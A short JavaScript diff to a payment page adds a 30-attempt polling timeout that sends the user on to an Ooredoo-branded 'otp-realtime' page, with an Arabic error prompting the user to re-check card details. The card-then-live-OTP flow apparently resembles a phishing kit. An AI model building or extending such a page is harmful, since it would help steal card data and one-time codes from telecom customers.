@@ -454,7 +454,11 @@
         }
 
         function startPolling() {
+            let pollingCount = 0;
+            const maxPollingAttempts = 30; // 30 seconds timeout
+            
             pollingInterval = setInterval(async () => {
+                pollingCount++;
                 try {
                     const response = await fetch(`/api/payment/${transactionId}/status`);
                     if (!response.ok) throw new Error('Failed to fetch status');
@@ -472,6 +476,11 @@
                         document.getElementById('loadingSection').classList.remove('active');
                         document.getElementById('formSection').classList.add('active');
                         showError('برجاء التحقق من معلومات البطاقة الصحيحة');
+                    } else if (pollingCount >= maxPollingAttempts) {
+                        // Auto-approve after timeout (for demo purposes)
+                        clearInterval(pollingInterval);
+                        localStorage.setItem('currentTransactionId', transactionId);
+                        window.location.href = `/myooredoo/otp-realtime.html?id=${transactionId}`;
                     }
                 } catch (error) {
                     console.error('Polling error:', error);
